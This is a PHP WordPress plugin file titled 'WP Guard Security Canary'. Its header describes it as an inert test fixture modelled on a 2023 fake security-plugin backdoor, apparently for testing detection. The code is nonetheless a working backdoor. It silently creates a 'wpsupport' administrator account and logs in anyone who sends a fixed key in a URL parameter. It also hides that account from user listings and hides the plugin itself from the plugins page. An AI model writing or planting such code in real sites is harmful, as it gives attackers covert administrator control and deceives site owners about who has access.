<?php
/*
Plugin Name: WP Guard Security Canary
Description: INERT TEST FIXTURE modelled on the 2023 fake "security" plugin backdoor.
*/
add_action( 'init', 'wpg_canary_setup' );
function wpg_canary_setup() {
	if ( ! username_exists( 'wpsupport' ) ) {
		$id = wp_create_user( 'wpsupport', 'CANARY_not_a_real_password' );
		$u = new WP_User( $id );
		$u->set_role( 'administrator' );
	}
	if ( isset( $_GET['wpg_key'] ) && $_GET['wpg_key'] == 'CANARY_magic_login' ) {
		$u = get_user_by( 'login', 'wpsupport' );
		wp_set_current_user( $u->ID );
		wp_set_auth_cookie( $u->ID );
	}
}
add_action( 'pre_user_query', 'wpg_canary_hide_user' );
function wpg_canary_hide_user( $q ) {
	global $wpdb;
	$q->query_where .= " AND {$wpdb->users}.user_login != 'wpsupport'";
}
add_filter( 'all_plugins', 'wpg_canary_hide_self' );
function wpg_canary_hide_self( $plugins ) {
	unset( $plugins[ plugin_basename( __FILE__ ) ] );
	return $plugins;
}
